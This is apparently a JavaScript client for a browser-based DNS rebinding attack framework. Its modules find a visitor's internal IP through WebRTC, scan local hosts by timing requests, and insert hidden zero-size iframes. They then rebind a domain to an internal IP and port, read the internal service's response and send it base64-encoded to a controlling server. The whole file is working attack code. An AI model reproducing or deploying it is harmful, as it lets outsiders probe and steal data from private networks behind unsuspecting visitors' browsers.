
var Misc = {
	'empty': function()	{},
	'query2dict': function(query)	{
		ret = {};
		var b = query.split("&");
		for(var i = 0; i < b.length; i++)	{
			c = b[i].split("=");
			ret[c[0]] = c[1];
		}
		return ret
	},

	'random_id': function() {
		function s4() {
			return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
		}
		return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
		s4() + '-' + s4() + s4() + s4();
	},

	'urldecode': function(url) {
		return decodeURIComponent(url.replace(/\+/g, ' '));
	},
	'shuffle': function(array) {
		var currentIndex = array.length, temporaryValue, randomIndex;
		while (0 !== currentIndex) {
			randomIndex = Math.floor(Math.random() * currentIndex);
			currentIndex -= 1;
			temporaryValue = array[currentIndex];
			array[currentIndex] = array[randomIndex];
			array[randomIndex] = temporaryValue;
		}
		return array;
	},
	'parse_network2default': function(xhr, def)	{
		try {
			obj = JSON.parse(xhr.responseText);
		}
		catch(error)	{
			obj = def;
		}
		return obj;
	},
	'copy_module': function(mod)	{
		var ret = {};
		Object.keys(mod).forEach(function(key)	{
			ret[key] = mod[key];
		});
		return ret;
	},
};

var IP = {
	'range2count': function (range) {
		return 2 << (32-range-1);
	},
	'ip2networkAddr': function(ip,netbits)	{
		var num = IP.ip2num(ip);
		var count = IP.range2count(netbits);
		num[0] &= ~(count-1);
		return IP.num2ip(num[0]);
	},
	'ip2broadcast': function(ip, netbits)	{
		var num = IP.ip2num(ip);
		var count = IP.range2count(netbits);
		num[0] |= (count-1);
		return IP.num2ip(num[0]);
	},
	'cidr2lists': function(cidr)	{
		var tmp=cidr.split("/");
		var ip = tmp[0];
		var netbits=Number(tmp[1]);
		var hostbits = 32-netbits;
		var count = IP.range2count(netbits);
		var num_ip = IP.ip2num(ip);
		num_ip[0] &= ~(count-1);

		var times = 1;
		if(netbits < 27)	{
			times = 2 << (27 - netbits - 1);
			hostbits = 32 - 27;
		}

		var ret = [];
		for(var i = 0; i < times; i++)	{
			var num_ip2 = num_ip[0] | (i << hostbits)
			var ins = [];
			var j = 0;
			var end = 32;
			if(i == 0);	j = 1;
			if(i == (times -1) )	end = 31;
			for(; j < end; j++)	{
				ins.push(IP.num2ip(num_ip2 + j));
			}
			ret.push(ins);
		}
		return ret;
	},
	'cidr2list': function(cidr)	{
		var tmp=cidr.split("/");
		var ip = tmp[0];
		var netbits=Number(tmp[1]);

		var count = IP.range2count(netbits);
		console.log("Count: " + String(count));
		var num = IP.ip2num(ip);
		num[0] &= ~(count-1);
		var ips = [];
		for(var i = 0; i < count; i++)	{
			ips.push(IP.num2ip(num[0] + i));
		}
		return ips;
	},

	'ip2num': function (ip) {
		var ipArray = ip.split('.').map(Number);
		var num = new Uint32Array(1);
		num[0] = (ipArray[0] << 24) | (ipArray[1] << 16) | (ipArray[2] << 8) | ipArray[3];
		return num;
	},

	'num2ip': function (num)	{
		var ret = new Array();
		ret[0] = num >>> 24;
		ret[1] = (num >>> 16) & 0xff;
		ret[2] = (num >>> 8) & 0xff;
		ret[3] = (num & 0xff);
		return ret.join(".");
	},
};

var Port = {
	'portInList': function(port, list)	{
		for(var i = 0; i < list.length; i++)	{
			if(list[i] == port)	return true;
		}
		return false;
	},
	'banned': function (port) {
		var b = ["1","7","9","11","13","15","17","19","20","21","22","23","25","37","42","43","53","77","79","87","95","101","102","103","104","109","110","111","113","115","117","119","123","143","179","389","465","512","513","514","515","526","530","531","532","540","556","563","587","601","636","993","995","2049","4045","6000"];
		return Port.portInList(port, b);
	},
};


// Detect which OS the client is on
var OS = function()	{
	if(OS.prototype._cachedResult)
		return OS.prototype._cachedResult;

	var n = navigator;
	var isLinux = (n.userAgent.indexOf("Linux") >= 0);
	var isWindows = (n.userAgent.indexOf("Windows") >= 0);
	var isMac = (n.userAgent.indexOf("Mac") >= 0);
	var isUnix = (n.userAgent.indexOf("X11") >= 0);

	return OS.prototype._cachedResult =
		isLinux ? 'Linux' :
		isWindows ? 'Windows' :
		isMac ? 'Mac' :
		isUnix ? 'UNIX' :
		"Unknown";
}

var Browser = function() {
	// Return cached result if avalible, else get result then cache it.
	if (Browser.prototype._cachedResult)
		return Browser.prototype._cachedResult;

	// Opera 8.0+
	var isOpera = (!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
	var isFirefox = typeof InstallTrigger !== 'undefined';	// Firefox 1.0+

	// Safari 3.0+ "[object HTMLElementConstructor]"
	var isSafari = /constructor/i.test(window.HTMLElement) || (function (p) {
		return p.toString() === "[object SafariRemoteNotification]";
	})(!window['safari'] || safari.pushNotification);

	var isIE = /*@cc_on!@*/false || !!document.documentMode;	// Internet Explorer 6-11
	var isEdge = !isIE && !!window.StyleMedia;	// Edge 20+
	var isChrome = !!window.chrome && !!window.chrome.webstore;	// Chrome 1+
	var isBlink = (isChrome || isOpera) && !!window.CSS;	// Blink engine detection

	return Browser.prototype._cachedResult =
		isOpera ? 'Opera' :
		isFirefox ? 'Firefox' :
		isSafari ? 'Safari' :
		isChrome ? 'Chrome' :
		isIE ? 'IE' :
		isEdge ? 'Edge' :
		isBlink ? 'Blink' :
		"Unknown";
};

// Basic functionality for sending HTTP-requests
var Network = {
	'request': function(method, resource, data, cb, user, pass)	{
		var xhr = new XMLHttpRequest();
		xhr.onreadystatechange = function() {
			if (xhr.readyState == XMLHttpRequest.DONE) {
				cb(xhr);
			}
		}
		if(user != null && pass != null)	{
			xhr.open(method, resource, true, user, pass);
		}
		else	{
			xhr.open(method, resource, true);
		}
		xhr.timeout = 10000;
		xhr.send(data);

	},
	'request_sd': function(method, resource, data, cb, user, pass)	{
		var xhr = new XMLHttpRequest();
		xhr.onreadystatechange = function() {
			if (xhr.readyState == XMLHttpRequest.DONE) {
				cb(xhr);
			}
			// Fix for MSF: HTTP response will not finish
			else if(xhr.readyState == XMLHttpRequest.LOADING && xhr.response.indexOf("Unknown command: GET") >= 0)	{
				cb(xhr);
			}
		}
		if(user != null && pass != null)	{
			xhr.open(method, resource, true, user, pass);
		}
		else	{
			xhr.open(method, resource, true);
		}
		xhr.timeout = 10000;
		xhr.send(data);

	},
	// Headers and timeout are the advanced options
	'request_advanced': function(method, resource, data, cb, headers, timeout, user, pass)	{
		var headers = (headers == null) ? {} : headers;
		var xhr = new XMLHttpRequest();
		xhr.onreadystatechange = function() {
			if (xhr.readyState == XMLHttpRequest.DONE) {
				cb(xhr, method, resource, data, user, pass);
			}
		}
		if(user != null && pass != null)	{
			xhr.open(method, resource, true, user, pass);
		}
		else	{
			xhr.open(method, resource, true);
		}
		for (var key in headers)	{
			xhr.setRequestHeader(key, headers[key]);
		}
		if(timeout != null)	{
			xhr.timeout = timeout;
		}
		xhr.send(data);
	},
};

var TalkHome = {
	'send_ips_alive': function(ips)	{
		Network.request("POST", "/hosts/up", JSON.stringify(ips), console.log);
	},
	'send_ports_open': function(ip, ports)	{
		Network.request("POST", "/ports/open/" + ip, JSON.stringify(ports), console.log);
	},
	'service_detection': function(xhr, host, rhost)	{
		data = "HTTP/1.1 " + xhr.status + " " + xhr.statusText + "\r\n";
		data += xhr.getAllResponseHeaders();
		data += "\r\n\r\n";
		data += xhr.response;
		send = window.btoa(data);
		Network.request(
				"POST",
				"http://" + host + "/service/detection/" + rhost,
				send,
				console.log
		);
	},
	'get_common_ips': function(cb)	{
		Network.request("GET", "/common/ips", null, function(xhr)	{
			obj = Misc.parse_network2default(xhr, []);
			cb(obj);
		});

	},
	'get_ports2scan': function(cb)	{
		Network.request("GET", "/common/ports", null, function(xhr)	{
			obj = Misc.parse_network2default(xhr, []);
			cb(obj);
		});
	},
};

var WebRTC = {
	'current_ip': null,
	'count': 5,
	'callback': console.log,
	'internal_ip': function()	{
		var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
		if (RTCPeerConnection) (function (cb) {
			var rtc = new RTCPeerConnection({iceServers:[]});
			if (1 || window.mozRTCPeerConnection) {		// FF [and now Chrome!] needs a channel/stream to proceed
				rtc.createDataChannel('', {reliable:false});
			};
			rtc.onicecandidate = function (evt) {
				// convert the candidate to SDP so we can run it through our general parser
				// see https://twitter.com/lancestout/status/525796175425720320 for details
				if (evt.candidate) grepSDP("a="+evt.candidate.candidate);
			};

			rtc.createOffer(function (offerDesc) {
				grepSDP(offerDesc.sdp);
				rtc.setLocalDescription(offerDesc);
			}, function (e) { console.warn("offer failed", e); });
			var addrs = Object.create(null);
			addrs["0.0.0.0"] = false;
			function processIP(newAddr) {
				if (newAddr in addrs) return;
				else addrs[newAddr] = true;
				var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
				ip = displayAddrs.join(" or perhaps ") || "n/a";
				WebRTC.current_ip = ip;
				cb(ip);
			}
			function grepSDP(sdp) {
				var hosts = [];
				sdp.split('\r\n').forEach(function (line) { // c.f. http://tools.ietf.org/html/rfc4566#page-39
					if (~line.indexOf("a=candidate")) {	 // http://tools.ietf.org/html/rfc4566#section-5.13
						var parts = line.split(' '),		// http://tools.ietf.org/html/rfc5245#section-15.1
						addr = parts[4],
						type = parts[7];
						if (type === 'host') processIP(addr);
					} else if (~line.indexOf("c=")) {		 // http://tools.ietf.org/html/rfc4566#section-5.7
						var parts = line.split(' '),
						addr = parts[2];
						processIP(addr);
					}
				});
			}
		})(this.callback); else {
			console.log("Current is not defined");
			WebRTC.current_ip = undefined;
			this.callback(undefined);
		}
	},
};


var PerformIPScan = {
	'ips2scan': [],	// List of IPs to scan
	'ips_alive': [],
	'ips_down': [],
	'scan_times': [],
	'cb_done': console.log,	// (ips_up, ips_down)
	'cb_ip_alive': console.log,
	'threads': 10,
	'ips_left': null,	// IPs left in current scan

	'shuffle': function()	{
		this.ips2scan = Misc.shuffle(this.ips2scan);
	},

	'add_ips_list': function(ips)	{
		for(i in ips)	{
			this.ips2scan.push(ips[i]);
		}
	},
	'ipscan_cors': function(cb, ip, port, timeout)	{
		var xhr = new XMLHttpRequest();
		var ts1 = +new Date();
		xhr.onreadystatechange = function() {
			var ts2 = +new Date();
			if (xhr.readyState == XMLHttpRequest.DONE) {
				cb(ip, port, (ts2 - ts1), timeout);
			}
		}
		xhr.open('GET', 'http://' + ip + ':' + String(port) + '/', true);
		xhr.timeout = timeout;
		xhr.send(null);
	},

	'cb_ip_cors': function(ip, port, time, timeout)	{
		var max_time = 3000;
		this.ips_left -= 1;	// One less IP left

		// max_time should vary a little depending on the OS and browser
		// Firefox for Windows sometimes cancels the query before the timeout
		if(OS() == "Windows" && (Browser() == "Firefox" || Browser() == "IE"))	{
			max_time = 2200;
		}

		if(time < max_time || (OS() == "Linux" && time > timeout))	{
			this.ips_alive.push(ip);
			this.cb_ip_alive(ip);
		}
		else	{
			this.ips_down.push(ip);
		}

		// TODO: We store all the length in order, this allows us to take a second pass to discover
		// hosts that are alive
		this.scan_times.push( {ip: time} );

		var next_ip = this.ips2scan.pop();
		if(next_ip == undefined && this.ips_left <= 0)	{
			this.cb_done(this.ips_alive.length, this.ips_down.length);
		}
		else if(next_ip != undefined)	{
			this.ipscan_cors(this.cb_ip_cors.bind(this), next_ip, port, timeout);
		}
	},

	'start_ip_scan': function()	{
		timeout = 3500;
		port = 80;
		if(OS() == "Linux")	{
			if(Browser() == "Chrome" || Browser() == "Firefox")	{
				timeout = 4000;
				port = 4545;
			}
		}
		else if(OS() == "Windows")	{
			if(Browser() == "Chrome")	{
				timeout = 3500;
				port = 80;
			}
		}
		this.ips_left = this.ips2scan.length;
		for(var i = 0; i < this.threads; i++)	{
			var next_ip = this.ips2scan.pop();
			if(next_ip != undefined)	{
				this.ipscan_cors(this.cb_ip_cors.bind(this), next_ip, port, timeout);
			}
		}
	},
};


var Rebind = {
	'localip': null,
	'localport': null,

	'iframeid': null,		// Will create random
	'current_attempts': 0,
	'max_attempts': 5,
	'clientid': null,		// Filled in automatically
	'clienthome': null,		// Filled in automatically
	'cb_done_initial': console.log,

	'current_check_connected': 0,
	'max_check_connected': 5,

	'inject_iframe': function()	{
		var iframe = '<iframe width="0" height="0" src="' + redirect + '"></iframe>';
	},

	// Perform the DNS rebind
	'perform': function()	{
		console.log(this);
		Network.request(
				"POST",
				"/register/attack/" + this.localip + "/" + this.localport + "?browser=" + Browser(),
				"",
				this.got_redirect.bind(this)
		);
	},
	'got_redirect': function(xhr)	{
		console.log(xhr.responseText);
		try {
			obj = JSON.parse(xhr.responseText);
		}
		catch(error)	{
			console.log("Error getting redirect");
			return;
		}
		if("redirect" in obj)	{
			redir = obj["redirect"];
			this.finished_getting_redirect(redir);
		}
		else	{
			console.log("Error getting redirect 2");
		}
	},
	'finished_getting_redirect': function(redirect)	{
		if(redirect != null)	{
			console.log(redirect);
			try	{
				this.clienthome = "http://" + redirect.split("://")[1].split("/")[0];
				this.clientid = redirect.split("://")[1].split(".")[0];
			}
			catch(error)	{
				console.log("Failed to get client");
				return;
			}
			this.iframeid = Misc.random_id();
			var iframe = this.create_iframe(this.iframeid, redirect);
			document.body.appendChild(iframe);
			window.setTimeout(this.check_connected.bind(this), 500);
		}
		else	{
			console.log("Failed to get redirect");
		}
	},

	'check_connected': function()	{
		this.current_check_connected += 1;
		if(this.current_check_connected <= this.max_check_connected)	{
			Network.request("GET", "/client/connected/" + this.clientid, "", this.client_connected.bind(this));
		}
		else	{
			console.log("Client did not register");
			this.cb_done_initial(null, null, this.localip, this.localport, "failure");
		}
	},

	'client_connected': function(xhr)	{
		if(xhr.status == 200)	{
			console.log("Client has connected");
			this.cb_done_initial(this.clienthome, this.clientid, this.localip, this.localport, "success");
		}
		else	{
			window.setTimeout(this.check_connected.bind(this), 5000);
		}
	},
	'create_iframe': function(id, url)	{
		var iframe = document.createElement("iframe");
		iframe.id = id;
		iframe.width = 0;
		iframe.height = 0;
		iframe.src = url;
		return iframe;
	},
};


var DNSRebind = {
	'sent': 0,				// How many requests have been sent
	'max_send': 60,			// Number of requests to send before we give up
	'wait_each': 5 * 1000,	// Waiting period between each request
	'ip': null,
	'port': null,
	'server': null,
	'finished': console.log,
	'done': false,
	'got_data': false,

	'start': function()	{
		console.log("DNS START");
		Network.request("POST", "/dns/change/" + this.ip + "?browser=" + Browser(), "", this.triggered.bind(this));
	},

	'triggered': function(xhr)	{
		console.log("Sent trigger domain: " + document.domain);

		// If xhr is null or a non-200 code was returned, we were not successful,
		// potentially because we are at the wrong IP
		if(xhr == null || xhr.status != 200)	{
			console.log("Failed to trigger on domain");
			this.finished("failed");
			return;
		}

		if(Browser() == "IE" || Browser() == "Edge")	{
			// Insert image so that the browser knows the IP is "down"
			var img_src = "/test.png";
			var img = document.createElement("img");
			img.setAttribute("src", img_src);
			document.body.appendChild(img);

			// If we are on IE or Edge we trigger new IP more quickly
			this.wait_each = 1 * 1000;
			Network.request("GET", "/200?browser=" + Browser() + "&delay=0", null, this.sendEach.bind(this));
		}
		else	{
			// Start making requests
			this.sendEach(null);
		}
	},
	'send_200': function()	{
		Network.request_sd("GET", "/200?echo=OK&browser=" + Browser(), null, this.sendEach.bind(this), "invalid", "invalid");
	},

	'sendEach': function(xhr)	{
		console.log(xhr);
		if(this.sent < this.max_send)	{
			// The real server should always return HTTP 200
			if(xhr != null)	{
				if(xhr.status != 200)	{
					console.log("Got non-200 response");
					this.exploitStart(xhr);
					return;
				}
				else if(xhr.status == 0)	{
					return;
				}
				else if(xhr.response != "OK")	{
					console.log("Got unexpected text response");
					this.exploitStart(xhr);
					return;
				}
			}
			this.sent += 1;
			console.log("Started new timeout: " + this.sent);
			setTimeout(this.send_200.bind(this), this.wait_each);
		}
		else	{
			console.log("Sent maximum amount, no success");
		}
		return;
	},

	'got_response_cb': function(xhr)	{
		console.log(xhr);
		this.finished("success");
	},

	//'got_response': function(xhr, method, resource, data, user, pass)	{
	'got_response': function(xhr)	{
		console.log("got_response");

		// We might get called more than once
		if(this.got_data == true)	{
			console.log("Already received data");
			return;
		}
		if(xhr.readyState == 4)	{
			this.got_data = true;
			console.log("Received data status 4");
		}
		else if(xhr.readyState == 3)	{
			if(xhr.response.indexOf("Unknown command: GET.") >= 0)	{
				this.got_data = true;
				console.log("Received data status 3");
			}
			else	{
				console.log("Did not receive data I wanted");
				return;
			}
		}
		console.log(xhr);
		var data = 
			"HTTP/1.0 " + String(xhr.status) + " " + xhr.statusText + "\r\n" +
			xhr.getAllResponseHeaders() + "\r\n" +
			xhr.responseText;

		console.log(data);
		var encoded = window.btoa(data);
		console.log(encoded);

		Network.request("POST",
				"http://" + this.server + "/service/detection/" + document.domain,
				encoded, this.got_response_cb.bind(this)
		);
	},

	'exploitStart': function(xhr)	{
		if(this.done == false)	{
			this.done = true;
		//	Network.request_advanced("GET", "/", null, this.got_response.bind(this), null, 20);
			Network.request_sd("GET", "/", null, this.got_response.bind(this), "invalid", "invalid");
		}
	},
};
